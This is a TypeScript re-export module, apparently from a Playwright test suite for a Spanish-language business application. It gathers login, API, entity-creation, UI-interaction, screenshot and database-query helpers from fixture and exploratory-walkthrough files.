// ─────────────────────────────────────────────────────────────────────────────
//  RE-EXPORTS para conveniencia
// ─────────────────────────────────────────────────────────────────────────────

export {
  // From ../00-fixtures
  test as testLegacy,
  expect,
  type Page,
  type APIRequestContext,
  login,
  loginAsLegacy as loginAs,
  fullLogin,
  skipBaseCaja,
  handleBaseCaja,
  apiGet,
  apiPost,
  apiPut,
  apiPatch,
  apiDelete,
  createCliente,
  createClienteFull,
  createPedido,
  createTrabajador,
  createEmbarque,
  createSellador,
  createProveedor,
  createInsumo,
  createNegocio,
  getFirstCliente,
  getFirstTrabajador,
  getSellador,
  getFirstFacturaConSaldo,
  setupClienteWithPedidos,
  clickButton,
  fillInput,
  selectOption,
  waitForToast,
  setMobileViewport,
  checkTouchTargets,
  checkHorizontalOverflow,
  goto,
  getUniqueFutureDate,
  // From ../../exploratory/walkthrough-helpers
  CREDENTIALS,
  skipBaseCajaExploratory as skipBaseCajaExploratory,
  addFindingExploratory as addFinding,
  getFindingsCount,
  isVisibleExploratory as isVisible,
  hasHorizontalOverflow as checkOverflowLegacy,
  hasGarbageText as checkGarbageTextLegacy,
  shootExploratory as shoot,
  EXPLORATORY_SCREENSHOTS_DIR as SCREENSHOTS_DIR,
  EXPLORATORY_RUN_ID as RUN_ID,
  EXPLORATORY_FINDINGS_FILE as FINDINGS_FILE,
  dbCount,
  dbQuery,
  BASE,
}
